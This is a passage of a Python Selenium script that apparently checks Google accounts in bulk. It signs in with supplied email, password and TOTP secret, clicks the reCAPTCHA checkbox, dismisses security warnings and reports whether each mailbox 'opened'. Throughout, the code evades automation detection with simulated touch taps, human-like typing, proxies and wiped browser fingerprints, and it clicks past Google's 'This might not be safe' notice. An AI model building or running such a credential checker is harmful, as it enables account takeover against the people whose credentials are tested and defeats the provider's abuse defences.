    clipboard_type(driver, email_field, email)   # instant paste — xdotool clipboard
    rand_sleep(100, 200)
    # Click the "Next" button via touch — more human than Keys.ENTER (detectable as Selenium)
    _email_next = wait_for_any([
        '#identifierNext button', '#identifierNext', '[jsname="LgbsSe"]',
        'button[type="button"]', 'div[role="button"]',
    ], timeout=4)
    if _email_next:
        try:
            touch_click(driver, _email_next)   # TouchEvent tap on Next
        except Exception:
            email_field.send_keys(Keys.ENTER)
    else:
        email_field.send_keys(Keys.ENTER)

    # Wait for any URL change that signals automation rejection or a challenge page.
    # Google's sign-in is an SPA: after typing email + clicking Next, the URL
    # STAYS at /v3/signin/identifier while the password field appears in-place.
    # We only break early if Google navigates away (rejected or challenge).
    # If the URL doesn't change (normal SPA case), we time out and proceed to
    # Step 3 which looks for the password field directly.
    _nav_deadline = time.time() + 8
    while time.time() < _nav_deadline:
        try:
            _cur = driver.current_url
            if "signin/rejected" in _cur or ("signin/" in _cur and "identifier" not in _cur):
                break
        except Exception:
            pass
        time.sleep(0.25)
    rand_sleep(300, 600)  # brief settle

    url, text = page_state()
    log(f"{email} — After email submit: {url[:70]}")

    if "signin/rejected" in url:
        shot = screenshot_b64()
        return {
            "status": "verification_required",
            "reason": "Google stopped on accounts.google.com: Couldn't sign you in. This browser or app may not be secure. Password and 2FA did not start.",
            "totpCode": totp_code,
            "debugScreenshot": shot,
        }

    # uplevelingstep after email = stale session cookies — dismiss and continue
    if "uplevelingstep" in url:
        log(f"{email} — uplevelingstep after email submit, dismissing and continuing")
        for _ui in range(4):
            try:
                driver.execute_script("""
                    var skip_texts=['not now','skip','later','no thanks','dismiss','cancel'];
                    var btns=Array.from(document.querySelectorAll('button,a[role="button"]'));
                    for(var t of skip_texts){
                        var f=btns.find(b=>b.innerText&&b.innerText.trim().toLowerCase()===t);
                        if(f){f.click();return 'clicked:'+t;}
                    }
                    if(btns.length>=2)btns[btns.length-2].click();
                """)
            except Exception:
                pass
            rand_sleep(700, 1200)
            url, text = page_state()
            if "uplevelingstep" not in url:
                break

    # Same step as a phone: Google shows "I'm not a robot" after the email,
    # one checkbox click, then the password page. An image puzzle is a
    # different page — we do not try to solve that.
    if "challenge/recaptcha" in url:
        log(f"{email} — I'm not a robot checkbox — clicking it")
        _rc_result = "missed"
        try:
            _iframe_deadline = time.time() + 8
            _anchor_frame = None
            while time.time() < _iframe_deadline and _anchor_frame is None:
                driver.switch_to.default_content()
                for _fr in driver.find_elements(By.CSS_SELECTOR, "iframe[src*='recaptcha']"):
                    _src = _fr.get_attribute("src") or ""
                    if "anchor" in _src or "bframe" not in _src:
                        if "bframe" in _src:
                            continue
                        _anchor_frame = _fr
                        break
                if _anchor_frame is None:
                    time.sleep(0.3)
            if _anchor_frame is not None:
                driver.switch_to.frame(_anchor_frame)
                _box = wait_for_any(["#recaptcha-anchor", ".recaptcha-checkbox-border"], timeout=6)
                if _box:
                    # Look at the box the way a phone user does, then click once.
                    rand_sleep(1200, 2200)
                    try:
                        natural_mouse_move(driver, _box)
                    except Exception:
                        pass
                    _box.click()
                    log(f"{email} — I'm not a robot checkbox clicked")
                driver.switch_to.default_content()

            def _checkbox_ticked() -> bool:
                driver.switch_to.default_content()
                for _fr in driver.find_elements(By.CSS_SELECTOR, "iframe[src*='recaptcha']"):
                    _src = _fr.get_attribute("src") or ""
                    if "bframe" in _src:
                        continue
                    try:
                        driver.switch_to.frame(_fr)
                        _anchor = driver.find_elements(By.CSS_SELECTOR, "#recaptcha-anchor")
                        if _anchor and _anchor[0].get_attribute("aria-checked") == "true":
                            driver.switch_to.default_content()
                            return True
                    except Exception:
                        pass
                    driver.switch_to.default_content()
                return False

            # The puzzle iframe is often already in the DOM. Success is the
            # checkbox ticking, same as on a phone — not the iframe existing.
            _rc_deadline = time.time() + 10
            while time.time() < _rc_deadline:
                driver.switch_to.default_content()
                if "challenge/recaptcha" not in driver.current_url or _checkbox_ticked():
                    _rc_result = "passed"
                    break
                time.sleep(0.4)
            else:
                _image = False
                driver.switch_to.default_content()
                for _bf in driver.find_elements(By.CSS_SELECTOR, "iframe[src*='bframe']"):
                    try:
                        if _bf.is_displayed() and _bf.size.get("height", 0) > 80:
                            _image = True
                            break
                    except Exception:
                        pass
                _rc_result = "image" if _image else "timeout"
        except Exception as _rc_err:
            log(f"{email} — recaptcha checkbox error: {_rc_err}")
            _rc_result = "missed"
        finally:
            try:
                driver.switch_to.default_content()
            except Exception:
                pass
        url, text = page_state()
        log(f"{email} — After I'm not a robot ({_rc_result}): {url[:70]}")
        if _rc_result != "passed":
            shot = screenshot_b64()
            _why = (
                "Google asked for an image puzzle after I'm not a robot."
                if _rc_result == "image"
                else "Google showed I'm not a robot and the checkbox did not open the password page."
            )
            return {
                "status": "verification_required",
                "reason": _why,
                "totpCode": totp_code,
                "debugScreenshot": shot,
            }

    result = classify(url, text)
    if result:
        return result

    PW_SELECTORS = [
        'input[name="Passwd"]',
        'input[type="password"]:not([name="hiddenPassword"])',
        'input[name="password"]',
        '#password input',
    ]

    # ── Step 3: Enter password ────────────────────────────────────────────────
    log(f"{email} — Step 3: typing password")
    pw_field = wait_for_any(PW_SELECTORS, timeout=8)

    if pw_field:
        url, text = page_state()
        result = classify(url, text)
        if result:
            return result

    if not pw_field:
        url, text = page_state()
        result = classify(url, text)
        if result:
            return result
        shot = screenshot_b64()
        return {
            "status": "unknown",
            "reason": f"Password field not found. URL: {url[:80]}",
            "totpCode": totp_code,
            "debugScreenshot": shot,
        }

    touch_click(driver, pw_field)    # TouchEvent — real phone fires touch not mouse
    rand_sleep(80, 160)
    clipboard_type(driver, pw_field, password)   # instant paste — xdotool clipboard
    rand_sleep(100, 180)
    # Click the "Next" button via touch — more human than Keys.ENTER (detectable as Selenium)
    _pw_next = wait_for_any([
        '#passwordNext button', '#passwordNext', '[jsname="LgbsSe"]',
        'button[type="button"]', 'div[role="button"]',
    ], timeout=4)
    if _pw_next:
        try:
            touch_click(driver, _pw_next)    # TouchEvent tap on Next
        except Exception:
            pw_field.send_keys(Keys.ENTER)
    else:
        pw_field.send_keys(Keys.ENTER)

    # Wait for URL to advance past the password page (proxy latency can be 2-4s).
    # Polling is more reliable than a fixed sleep — catches fast AND slow responses.
    _pre_pwd_url = driver.current_url
    _nav_deadline = time.time() + 10
    while time.time() < _nav_deadline:
        try:
            _cur = driver.current_url
            if _cur != _pre_pwd_url and "challenge/pwd" not in _cur:
                break
        except Exception:
            pass
        time.sleep(0.25)
    rand_sleep(300, 600)  # extra settle after URL change

    url, text = page_state()
    log(f"{email} — After password submit: {url[:70]}")

    # ── Quick wrong-password check (before anything else) ─────────────────────
    if any(x in text for x in [
        "wrong password", "didn't recognize", "that password is incorrect",
        "incorrect password", "password you entered"
    ]) or any(x in url for x in ["WrongPassword", "wrongpassword"]):
        return {"status": "wrong_password", "reason": "Wrong password", "totpCode": totp_code}

    # ── "This might not be safe" right after password submit ─────────────────
    # Google shows this when it detects unusual connection (proxy extension, new IP).
    # Has "Continue to sign in" button — click it and continue the login flow.
    _post_pw_text = text.lower()
    if (
        "might not be safe" in _post_pw_text
        or ("noticed something unusual" in _post_pw_text and (
            "continue to sign in" in _post_pw_text or "check the web address" in _post_pw_text
        ))
    ):
        log(f"{email} — 'This might not be safe' after password submit, clicking Continue")
        try:
            _pp_clicked = driver.execute_script("""
                var btns = Array.from(document.querySelectorAll(
                    'button, a[role="button"], [role="button"]'));
                var found = btns.find(function(b) {
                    var t = (b.innerText || b.textContent || '').toLowerCase().trim();
                    return t.indexOf('continue to sign in') !== -1;
                });
                if (found) { found.click(); return true; }
                if (btns.length >= 1) { btns[0].click(); return 'fallback'; }
                return false;
            """)
            log(f"{email} — Continue click result: {_pp_clicked}")
            if _pp_clicked:
                rand_sleep(1000, 1800)
                url, text = page_state()
                log(f"{email} — After Continue: {url[:70]}")
        except Exception as _ppe:
            log(f"Post-password Continue click error: {_ppe}")

    # Hard block / "browser not secure" can appear on challenge/pwd — classify first
    # (also wipes stale profile) before treating a pwd URL as a silent bounce.
    result = classify(url, text)
    if result:
        return result

    # If Google returned us BACK to the password page WITHOUT an error message
    # → this is automation detection, NOT a wrong password.
    # Google silently reloads challenge/pwd when it suspects a bot.
    # Classify as verification_required so auto-retry fires with fresh profile.
    if "challenge/pwd" in url or "ServicePasswordChallenge" in url:
        shot = screenshot_b64()
        return {
            "status": "verification_required",
            "reason": (
                "Google silently bounced back to password page (automation detected). "
                "Profile wiped — auto-retrying with fresh fingerprint."
            ),
            "totpCode": totp_code,
            "debugScreenshot": shot,
        }

    # ── Step 4: 2FA — check BEFORE classify so we handle it ourselves ─────────

    # Broad TOTP input selectors — used in multiple places below.
    # Covers all known Google Authenticator input variants across UI versions.
    _on_totp_url = is_totp_challenge_url(url)

    # Detect direct TOTP-input page (input already visible).
    # If we know we're on a TOTP URL, wait briefly for the field — single
    # find_element with no wait misses the field when the page is still rendering.
    totp_field = None
    if _on_totp_url:
        totp_field = wait_for_any(TOTP_INPUT_SELECTORS, timeout=8)
        log(f"{email} — TOTP URL detected ({url[:60]}), field={'found' if totp_field else 'not yet visible'}")
    else:
        try:
            totp_field = driver.find_element(By.CSS_SELECTOR,
                'input[name="totpPin"],input[name="Pin"],input[id="totpPin"],'
                'input[autocomplete="one-time-code"],input[aria-label*="code"],'
                'input[placeholder*="code"],input[placeholder*="Code"]')
        except Exception:
            pass

    # Detect method-selection page ("2-Step Verification — choose how you want")
    # Also trigger on URL: challenge/dp = device-protection 2FA selection,
    # challenge/selection = explicit 2FA method picker.
    # challenge/totp / challenge/ipp = already on TOTP input page (handle separately below).
    # Text: "verify that it's you" is the page heading for the Google Authenticator
    # challenge page — distinct from "verify it's you" (method-selection heading).
    is_2fa_select = (
        any(x in text for x in [
            "2-step verification",
            "choose how you want to sign in",
            "how do you want to sign in",
            "verify it's you",
            "verify that it's you",  # Google Authenticator challenge heading
        ])
        or "challenge/dp" in url
        or "challenge/selection" in url
        or _on_totp_url  # already on TOTP input page — treat as 2FA page
    )

    if is_2fa_select and totp_field is None:
        log(f"{email} — 2FA page detected (url={url[:60]})")
        if not totp_code:
            shot = screenshot_b64()
            # v3/signin/TL=... page: password was accepted — mark opened per user rule
            if "v3/signin" in url and "challenge" not in url:
                log(f"{email} — v3/signin TOTP page, no secret, field not yet visible → opened per user rule")
                return {"status": "opened", "reason": "Mailbox opened successfully ✅", "totpCode": None, "debugScreenshot": shot}
            return {
                "status": "2fa_required",
                "reason": "2FA required — add TOTP secret as 3rd field: email:password:totp_secret",
                "totpCode": None,
                "debugScreenshot": shot,
            }

        if _on_totp_url:
            # Already on the TOTP input page (challenge/totp or challenge/ipp).
            # Do NOT click Authenticator — just wait longer for the input field.
            log(f"{email} — Already on TOTP input page, waiting for field to render…")
            totp_field = wait_for_any(TOTP_INPUT_SELECTORS, timeout=15)
            if totp_field is None:
                log(f"{email} — TOTP field still not found on challenge/totp page after 15s wait")
        else:
            # Method-selection page — click the Google Authenticator option.
            log(f"{email} — Clicking 'Google Authenticator' option")

            def _click_authenticator():
                try:
                    driver.execute_script("""
                        // Try by data-challengetype (totp = 6)
                        var byType = document.querySelector('[data-challengetype="6"]');
                        if (byType) { byType.click(); return; }
                        // Try by visible text containing "authenticator"
                        var allEls = Array.from(document.querySelectorAll(
                            'li, div[role="listitem"], [data-challengetype]'));
                        var found = allEls.find(function(el) {
                            return el.innerText && el.innerText.toLowerCase().indexOf('authenticator') !== -1;
                        });
                        if (found) { found.click(); return; }
                        // Broader fallback — any clickable element with the word
                        var broader = Array.from(document.querySelectorAll('*')).find(function(el) {
                            return el.children.length === 0
                                && el.innerText
                                && el.innerText.toLowerCase().indexOf('authenticator') !== -1;
                        });
                        if (broader) broader.click();
                    """)
                except Exception as e:
                    log(f"Authenticator click error: {e}")

            _click_authenticator()
            rand_sleep(700, 1100)

            # Wait for the TOTP input to appear (longer timeout — SPA navigation on dp page)
            totp_field = wait_for_any(TOTP_INPUT_SELECTORS, timeout=18)

            # Fallback: try "Try another way" → then click authenticator again
            if totp_field is None:
                log(f"{email} — TOTP not found after first click, trying 'Try another way'")
                try:
                    driver.execute_script("""
                        var links = Array.from(document.querySelectorAll('a, button, [role="button"]'));
                        var found = links.find(function(el) {
                            var t = (el.innerText || '').toLowerCase();
                            return t.indexOf('more ways') !== -1 || t.indexOf('another way') !== -1
                                || t.indexOf('different') !== -1
                                || t.indexOf('more options') !== -1 || t.indexOf('try again') !== -1;
                        });
                        if (found) found.click();
                    """)
                    rand_sleep(700, 1200)
                    _click_authenticator()
                    rand_sleep(700, 1200)
                    totp_field = wait_for_any(TOTP_INPUT_SELECTORS, timeout=15)
                except Exception as e:
                    log(f"Try another way error: {e}")

        url, text = page_state()
        log(f"{email} — After 2FA handling: {url[:70]}, totp_field={'found' if totp_field else 'NOT found'}")

    # ── Enter TOTP code (whether we just navigated here or were already here) ─
    if totp_field is not None:
        if not totp_code and not totp_secret:
            shot = screenshot_b64()
            # v3/signin/TL=... page: Google already accepted the password.
            # Mark as opened per user rule — no TOTP secret needed to confirm accessibility.
            _cur_url = driver.current_url
            if "v3/signin" in _cur_url and "challenge" not in _cur_url:
                log(f"{email} — v3/signin TOTP page, no secret → opened per user rule (password accepted)")
                return {"status": "opened", "reason": "Mailbox opened successfully ✅", "totpCode": None, "debugScreenshot": shot}
            return {"status": "2fa_required", "reason": "2FA required — provide TOTP secret", "totpCode": None, "debugScreenshot": shot}

        # Fresh code each time — Google may show TOTP once or twice (or again after password change).
        enter_fresh_totp_once("Step 4 — TOTP")
        clear_totp_pages(max_rounds=2, pause_label="Step 4 — extra TOTP")

        rand_sleep(700, 1200)

        log(f"{email} — Waiting for Google Account after TOTP…")
        _totp_redirect_early = None
        deadline = time.time() + 30
        while time.time() < deadline:
            url = driver.current_url
            if signed_in_host(url) or is_google_password_change_url(url):
                break

            if is_totp_challenge_url(url):
                enter_fresh_totp_once("TOTP while waiting for redirect")
                rand_sleep(700, 1200)
                continue

            # ── Early exit: detect "Verify your info to continue" immediately ──
            # Any non-TOTP challenge URL = verification_required, no need to wait
            _is_hard_block = (
                (
                    "challenge" in url
                    and not any(x in url for x in (
                        "challenge/pwd", "challenge/dp", "challenge/totp",
                        "challenge/ipp", "challenge/selection", "challenge/sk",
                    ))
                )
                or "InterstitialConfirmation" in url
                or ("verify" in url and "mail" not in url and "challenge/pwd" not in url)
            )
            if _is_hard_block:
                _u2, _t2 = page_state()
                _r = classify(_u2, _t2)
                if _r:
                    log(f"{email} — Early verification_required detected in TOTP redirect loop: {url[:60]}")
                    _totp_redirect_early = _r
                    break
            # signin/continue may need a button click to proceed
            if "signin/continue" in url:
                try:
                    driver.execute_script("""
                        var btn = document.querySelector(
                            '#confirm, button[type="submit"], [data-action], button');
                        if (btn) btn.click();
                    """)
                except Exception:
                    pass
            time.sleep(0.5)
        if _totp_redirect_early:
            return _totp_redirect_early

        rand_sleep(700, 1200)
        url, text = page_state()
        log(f"{email} — After TOTP submit (final): {url[:70]}")

        # Wrong TOTP — auto-retry once with the next fresh 30s window
        _wrong_totp_phrases = [
            "wrong code", "that code didn't work", "code is incorrect",
            "enter the code again", "code expired", "try again",
            "didn't recognize that code",
        ]
        if any(x in text for x in _wrong_totp_phrases):
            if totp_secret:
                log(f"{email} — Wrong TOTP — waiting for next 30s window, then retry")
                _totp_cache["code"] = None
                _totp_cache["window"] = None
                if enter_fresh_totp_once("TOTP wrong-code retry", force_new=True):
                    rand_sleep(700, 1200)
                    url, text = page_state()
                    log(f"{email} — After TOTP retry: {url[:70]}")
                    retry_code = totp_code
                    if any(x in text for x in _wrong_totp_phrases):
                        if "v3/signin" in url and "challenge" not in url:
                            log(f"{email} — Wrong TOTP on v3/signin/TL page (2 attempts) → opened per user rule")
                            shot = screenshot_b64()
                            return {
                                "status": "opened",
                                "reason": "Mailbox opened successfully ✅",
                                "totpCode": retry_code,
                                "debugScreenshot": shot,
                            }
                        return {
                            "status": "wrong_password",
                            "reason": "TOTP codes wrong on 2 attempts — check 2FA secret",
                            "totpCode": retry_code,
                        }
            _cur_url_for_wrong = driver.current_url if hasattr(driver, 'current_url') else url
            if any(x in driver.page_source if hasattr(driver, 'page_source') else "" for x in _wrong_totp_phrases):
                # v3/signin/TL=... page: mark opened per user confirmation
                if "v3/signin" in _cur_url_for_wrong and "challenge" not in _cur_url_for_wrong:
                    log(f"{email} — Wrong TOTP on v3/signin/TL page (final check) → opened per user rule")
                    shot = screenshot_b64()
                    return {
                        "status": "opened",
                        "reason": "Mailbox opened successfully ✅",
                        "totpCode": totp_code,
                        "debugScreenshot": shot,
                    }
                return {
                    "status": "wrong_password",
                    "reason": f"TOTP code {totp_code} was wrong or expired — check your TOTP secret",
                    "totpCode": totp_code,
                }

        _pc_after_totp = complete_password_change_if_needed(url)
        if _pc_after_totp:
            return _pc_after_totp

        result = classify(url, text)
        if result:
            return result

        totp_completed = True  # Credentials + TOTP all verified successfully
    else:
        totp_completed = False

    # ── Classify whatever page we're on ───────────────────────────────────────
    result = classify(url, text)
    if result:
        return result

    # ── Post-login interstitial handler ───────────────────────────────────────
    # Google often shows recovery/address/terms screens before landing on Gmail.
    # Strategy: try to dismiss nicely first; if still not at Gmail after a few
    # attempts, force-navigate directly to the inbox.
    for _attempt in range(8):
        url, text = page_state()
        host = get_hostname(url)

        if signed_in_host(url):
            break

        # ── "This might not be safe" in interstitial loop — click Continue ──────
        _ltext_il = text.lower()
        _il_might_not_safe = (
            "might not be safe" in _ltext_il
            or ("noticed something unusual" in _ltext_il and (
                "continue to sign in" in _ltext_il or "check the web address" in _ltext_il
            ))
        )
        if _il_might_not_safe:
            log(f"{email} — 'This might not be safe' in interstitial loop (attempt {_attempt+1}), clicking Continue")
            try:
                _il_clicked = driver.execute_script("""
                    var btns = Array.from(document.querySelectorAll(
                        'button, a[role="button"], [role="button"]'));
                    var found = btns.find(function(b) {
                        var t = (b.innerText || b.textContent || '').toLowerCase().trim();
                        return t.indexOf('continue to sign in') !== -1;
                    });
                    if (found) { found.click(); return true; }
                    if (btns.length >= 1) { btns[0].click(); return 'fallback'; }
                    return false;
                """)
                log(f"{email} — Continue to sign in click: {_il_clicked}")
                rand_sleep(1000, 1800)
            except Exception as _ile:
                log(f"Interstitial Continue click error: {_ile}")
            continue  # re-check page state on next loop iteration

        # ── Early exit: "Verify your info to continue" / phone/device check ──
        # Detect immediately — no point looping or trying to dismiss
        _is_verify_info_screen = any(x in text for x in [
            "verify your info to continue",
            "choose a way to verify",
            "do a device check",
            "verifying your phone number",
        ])
        _is_hard_challenge_url = (
            (
                "challenge" in url
                and not any(x in url for x in (
                    "challenge/pwd", "challenge/dp", "challenge/totp",
                    "challenge/ipp", "challenge/selection", "challenge/sk",
                ))
                and "uplevelingstep" not in url
            )
            or "InterstitialConfirmation" in url
        )
        if _is_verify_info_screen or _is_hard_challenge_url:
            log(f"{email} — 'Verify your info' screen detected immediately → verification_required")
            shot = screenshot_b64()
            return {
                "status": "verification_required",
                "reason": "Google requires phone or device verification (Verify your info to continue)",
                "totpCode": totp_code,
                "debugScreenshot": shot,
            }

        dismissed = False

        # myaccount.google.com/signinoptions/password — optional demo password change
        if is_google_password_change_url(url):
            _pc_result = complete_password_change_if_needed(url)
            if _pc_result:
                return _pc_result
            log(f"{email} — Password change page skipped (demo toggle off), opening account home")
            try:
                driver.get(ACCOUNT_HOME)
            except Exception:
                pass
            dismissed = True

        # gds.google.com — recovery options, home address, etc.
        # Click "Not now" / "Skip" / "Later" properly so the auth session finalises
        elif "gds.google.com" in host:
            page_name = url[url.find('/web/'):url.find('?')] if '/web/' in url else url[:50]
            log(f"{email} — gds interstitial ({page_name}), clicking dismiss")
            try:
                clicked = driver.execute_script("""
                    var skip_texts = ['not now','skip','later','no thanks','dismiss',
                                      'cancel','maybe later','remind me later'];
                    var btns = Array.from(document.querySelectorAll('button, a[role="button"]'));
                    for (var t of skip_texts) {
                        var found = btns.find(function(b) {
                            return b.innerText && b.innerText.trim().toLowerCase() === t;
                        });
                        if (found) { found.click(); return true; }
                    }
                    // Fallback: last button (usually the secondary/skip action)
                    if (btns.length > 1) { btns[btns.length - 1].click(); return true; }
                    return false;
                """)
                if not clicked:
                    # Nothing to click — just navigate away
                    driver.get("https://myaccount.google.com/")
            except Exception as e:
                log(f"gds dismiss error: {e}")
                try:
                    driver.get("https://myaccount.google.com/")
                except Exception:
                    pass
            dismissed = True

        # uplevelingstep — Google account security upgrade prompt
        # BUT: uplevelingstep/selection can also be the phone/device verification screen.
        # Detect immediately by page text — no point trying to dismiss a hard block.
        elif "uplevelingstep" in url:
            _uptext = text.lower()
            _is_phone_verify = any(x in _uptext for x in [
                "verify your info to continue",
                "choose a way to verify",
                "do a device check",
                "verifying your phone number",
            ])
            if _is_phone_verify:
                log(f"{email} — uplevelingstep is phone/device verification screen → immediate verification_required")
                shot = screenshot_b64()
                return {
                    "status": "verification_required",
                    "reason": "Google requires phone or device verification (cannot bypass automatically)",
                    "totpCode": totp_code,
                    "debugScreenshot": shot,
                }
            log(f"{email} — uplevelingstep interstitial (attempt {_attempt+1}), clicking dismiss")
            if _attempt == 0:
                # First attempt: look for "Not now" / "Skip" / etc.
                # Include plain <a> tags — Google often renders "Not now" as a link, not a button
                try:
                    clicked = driver.execute_script("""
                        var skip_texts = ['not now','skip','later','no thanks',
                                          'dismiss','maybe later','remind me later','cancel'];
                        var els = Array.from(document.querySelectorAll(
                            'button, a, a[role="button"], [role="link"]'));
                        for (var t of skip_texts) {
                            var found = els.find(function(b) {
                                return b.innerText && b.innerText.trim().toLowerCase() === t;
                            });
                            if (found) { found.click(); return 'clicked:' + t; }
                        }
                        // Partial match fallback ("not now" might be "Not Now" with capital)
                        for (var t of skip_texts) {
                            var found = els.find(function(b) {
                                return b.innerText && b.innerText.trim().toLowerCase().indexOf(t) === 0;
                            });
                            if (found) { found.click(); return 'partial:' + t; }
                        }
                        return 'none';
                    """)
                    log(f"{email} — uplevelingstep dismiss result: {clicked}")
                except Exception as e:
                    log(f"uplevelingstep dismiss error: {e}")
                dismissed = True
            elif _attempt == 1:
                # Second attempt: try Gmail HTML version — bypasses some interstitials
                log(f"{email} — uplevelingstep: trying Gmail HTML version")
                try:
                    driver.get("https://myaccount.google.com/")
                    rand_sleep(800, 1200)
                    _html_url = driver.current_url
                    log(f"{email} — Gmail HTML URL: {_html_url[:70]}")
                    if signed_in_host(_html_url) and "uplevelingstep" not in _html_url:
                        # HTML Gmail loaded — classify it
                        _html_text = ""
                        try:
                            _html_text = driver.find_element(By.TAG_NAME, "body").text.lower()
                        except Exception:
                            pass
                        # Any Gmail HTML page that has inbox content = opened
                        if any(x in _html_text for x in ["inbox", "compose", "sent", "drafts"]):
                            rand_sleep(400, 700)
                            shot = screenshot_b64()
                            if fresh_profile:
                                try:
                                    driver.get("https://accounts.google.com/Logout?continue=https://mail.google.com")
                                    rand_sleep(800, 1200)
                                except Exception:
                                    pass
                            else:
                                log(f"{email} — HTML Gmail opened — keeping session (same-device mode)")
                            return {
                                "status": "opened",
                                "reason": "Mailbox opened (HTML Gmail) ✅",
                                "totpCode": totp_code,
                                "debugScreenshot": shot,
                            }
                except Exception as e:
                    log(f"Gmail HTML error: {e}")
                dismissed = True
            else:
                # 3+ attempts: uplevelingstep persists — mandatory phone/QR verification
                # Cannot bypass automatically regardless of whether TOTP was completed
                log(f"{email} — uplevelingstep persists after multiple attempts → verification_required")
                shot = screenshot_b64()
                return {
                    "status": "verification_required",
                    "reason": "Google requires phone or device verification to continue (cannot bypass automatically)",
                    "totpCode": totp_code,
                    "debugScreenshot": shot,
                }

        # signin/continue redirect page
        elif "signin/continue" in url:
            log(f"{email} — signin/continue, navigating directly to Gmail")
            try:
                driver.get("https://myaccount.google.com/")
            except Exception:
                pass
            dismissed = True

        # TOTP page reappeared — enter a fresh code and continue
        elif "challenge/totp" in url or "challenge/selection" in url:
            log(f"{email} — TOTP/selection page reappeared in interstitial loop, re-entering")
            if totp_secret:
                # Previous TOTP code was already consumed/rejected — same code
                # will always fail because TOTP codes are one-time-use per 30s window.
                # Always wait for the next window before generating a fresh code.
                _secs_until_next = 30 - (int(time.time()) % 30)
                if _secs_until_next > 1:
                    log(f"{email} — Waiting {_secs_until_next}s for next TOTP window (previous code consumed)…")
                    time.sleep(_secs_until_next + 0.5)
                fresh_code = generate_totp(totp_secret)
                log(f"{email} — Fresh TOTP code (new window): {fresh_code}")
                try:
                    # On selection page, click authenticator first
                    if "challenge/selection" in url:
                        driver.execute_script("""
                            var byType = document.querySelector('[data-challengetype="6"]');
                            if (byType) { byType.click(); return; }
                            var all = Array.from(document.querySelectorAll('*'));
                            var found = all.find(function(el) {
                                return el.children.length === 0 && el.innerText &&
                                       el.innerText.toLowerCase().indexOf('authenticator') !== -1;
                            });
                            if (found) found.click();
                        """)
                        rand_sleep(700, 1200)
                    tf = wait_for_any([
                        'input[name="totpPin"]', 'input[name="Pin"]',
                        'input[autocomplete="one-time-code"]', 'input[type="tel"]',
                        'input[aria-label*="code"]',
                    ], timeout=8)
                    if tf:
                        tf.clear()
                        rand_sleep(50, 100)
                        human_type(tf, fresh_code)
                        rand_sleep(150, 300)
                        tf.send_keys(Keys.ENTER)
                        rand_sleep(800, 1500)
                        dismissed = True
                except Exception as e:
                    log(f"Re-TOTP error: {e}")
            if not dismissed:
                # No TOTP secret or field not found — skip to Gmail
                try:
                    driver.get("https://myaccount.google.com/")
                    dismissed = True
                except Exception:
                    break

        # challenge/dp or challenge/selection in interstitial loop
        # = 2FA page that wasn't caught by Step 4 (safety net).
        # Click Authenticator option instead of a generic submit button.
        elif "accounts.google.com" in host and (
            "challenge/dp" in url or "challenge/selection" in url
        ):
            log(f"{email} — 2FA page in interstitial loop ({url[:60]}), clicking Authenticator")
            try:
                driver.execute_script("""
                    var byType = document.querySelector('[data-challengetype="6"]');
                    if (byType) { byType.click(); return; }
                    var allEls = Array.from(document.querySelectorAll(
                        'li, div[role="listitem"], [data-challengetype]'));
                    var found = allEls.find(function(el) {
                        return el.innerText && el.innerText.toLowerCase().indexOf('authenticator') !== -1;
                    });
                    if (found) { found.click(); return; }
                    var broader = Array.from(document.querySelectorAll('*')).find(function(el) {
                        return el.children.length === 0
                            && el.innerText
                            && el.innerText.toLowerCase().indexOf('authenticator') !== -1;
                    });
                    if (broader) broader.click();
                """)
                rand_sleep(700, 1200)
                # Check if TOTP field appeared — if yes, enter code and submit
                if totp_secret or totp_code:
                    fresh_code = generate_totp(totp_secret) if totp_secret else totp_code
                    if fresh_code:
                        secs_left = 30 - (int(time.time()) % 30)
                        if secs_left <= 4:
                            time.sleep(secs_left + 1)
                            fresh_code = generate_totp(totp_secret) if totp_secret else totp_code
                    tf = wait_for_any([
                        'input[name="totpPin"]', 'input[name="Pin"]',
                        'input[autocomplete="one-time-code"]', 'input[type="tel"]',
                        'input[aria-label*="code"]', 'input[type="number"]',
                    ], timeout=12)
                    if tf and fresh_code:
                        log(f"{email} — Entering TOTP in interstitial: {fresh_code}")
                        tf.clear()
                        rand_sleep(50, 100)
                        human_type(tf, fresh_code)
                        rand_sleep(150, 300)
                        tf.send_keys(Keys.ENTER)
                        rand_sleep(800, 1500)
            except Exception as e:
                log(f"2FA interstitial click error: {e}")
            dismissed = True

        # Any other accounts.google.com interstitial — try clicking primary CTA
        elif "accounts.google.com" in host:
            log(f"{email} — accounts interstitial ({url[:60]}), trying to proceed")
            try:
                driver.execute_script("""
                    var btn = document.querySelector(
                        'button[type="submit"], #confirm, [data-action="confirm"], button');
                    if (btn) btn.click();
                """)
                dismissed = True
            except Exception:
                pass

        else:
            # Unknown domain — force navigate to Gmail
            log(f"{email} — unknown page ({url[:60]}), forcing Gmail navigation")
            try:
                driver.get("https://myaccount.google.com/")
                dismissed = True
            except Exception:
                break

        if dismissed:
            rand_sleep(500, 800)
        else:
            break

    # Wait for the Google Account home (or Gmail, if Google still redirects there)
    deadline = time.time() + 12
    while time.time() < deadline:
        _cu = driver.current_url
        if signed_in_host(_cu):
            break
        # Early exit: challenge/verification URL — no need to wait
        if (
            ("challenge" in _cu and not any(x in _cu for x in (
                "challenge/pwd", "challenge/dp", "challenge/totp",
                "challenge/ipp", "challenge/selection", "challenge/sk",
            )))
            or "InterstitialConfirmation" in _cu
            or ("verify" in _cu and "mail" not in _cu)
        ):
            break
        time.sleep(0.5)

    rand_sleep(300, 600)
    url, text = page_state()
    log(f"{email} — Final page after interstitials: {url[:70]}")

    _password_change_result = complete_password_change_if_needed(url)
    if _password_change_result:
        return _password_change_result

    result = classify(url, text)
    if result:
        return result

    # ── True final fallback ───────────────────────────────────────────────────
    shot = screenshot_b64()
    # Google sometimes leaves the browser on the bare accounts host after a
    # successful sign-in/interstitial. Per the checker rules, this unexpected
    # page is an Open result rather than a verification failure.
    if get_hostname(url) == "accounts.google.com":
        return {
            "status": "opened",
            "reason": "Unexpected page: https://accounts.google.com — classified as Open",
            "totpCode": totp_code,
            "debugScreenshot": shot,
        }
    return {
        "status": "unknown",
        "reason": f"Unexpected page: {url[:80]}",
        "totpCode": totp_code,
        "debugScreenshot": shot,
    }


if __name__ == "__main__":
    main()
